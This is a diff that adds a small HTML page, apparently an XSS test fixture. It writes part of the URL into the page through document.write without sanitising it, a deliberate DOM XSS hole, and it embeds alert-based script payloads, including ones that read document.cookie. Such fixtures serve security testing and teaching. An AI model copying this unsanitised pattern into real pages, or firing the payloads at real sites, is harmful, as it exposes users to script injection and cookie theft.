@@ -1,0 +1,16 @@
+<!DOCTYPE HTML>
+<html>
+<body>
+<center>
+
+<script>
+var pos=document.URL.indexOf("message=")+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</script>
+
+<script>alert(document.cookie);</script>
+<script>alert("Stored XSS")</script>
+"><script>alert(document.cookie)</script>
+
+</body>
+</html>
